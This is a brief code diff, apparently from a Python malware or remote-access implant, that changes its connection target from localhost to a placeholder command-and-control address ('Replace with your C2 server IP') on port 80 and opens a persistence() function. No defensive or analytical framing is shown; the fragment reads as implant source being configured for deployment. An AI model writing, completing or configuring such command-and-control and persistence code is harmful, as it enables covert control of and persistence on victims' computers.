@@ -2,8 +2,8 @@ import http.client, socket, requests
 import os, subprocess, shutil
 import json, time
 
-HOST = "localhost"
-PORT = 4443
+HOST = "{C2_IP}" # Replace with your C2 server IP
+PORT = 80
 
 def persistence():
     try:
